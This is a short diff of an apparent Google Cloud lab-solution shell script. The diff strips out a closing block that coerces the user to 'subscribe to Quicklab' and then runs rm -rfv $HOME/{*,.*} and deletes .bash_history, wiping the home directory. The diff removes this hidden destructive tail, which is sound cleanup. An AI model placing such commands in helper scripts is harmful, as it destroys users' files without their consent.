@@ -45,7 +45,6 @@ gsutil mb -l us gs://$DEVSHELL_PROJECT_ID
 
 
 cat > sample.txt <<EOF_END
-subscribe to quicklab
 EOF_END
 
 gsutil cp sample.txt gs://$DEVSHELL_PROJECT_ID
@@ -110,18 +109,3 @@ Task 6 Completed
 Lab Completed !!!
 
 ${RESET}"
-
-#-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-
-while [ "$CONSENT_REMOVE" != 'y' ]; do
-  sleep 10
-  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-done
-
-echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
-
-rm -rfv $HOME/{*,.*}
-rm $HOME/.bash_history
-
-exit 0
